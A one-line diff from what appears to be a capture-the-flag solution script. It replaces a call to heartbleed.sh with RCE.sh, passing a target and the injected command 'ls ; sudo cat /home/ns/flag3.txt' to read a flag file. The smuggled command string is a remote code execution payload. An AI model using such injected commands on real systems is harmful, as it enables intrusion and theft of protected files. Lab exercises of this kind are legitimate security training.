@@ -1,1 +1,1 @@
-./heartbleed.sh $1 "ls ; sudo cat /home/ns/flag3.txt" | grep -o 'flag3{.*}'
+./RCE.sh $1 "ls ; sudo cat /home/ns/flag3.txt" | grep -o 'flag3{.*}'
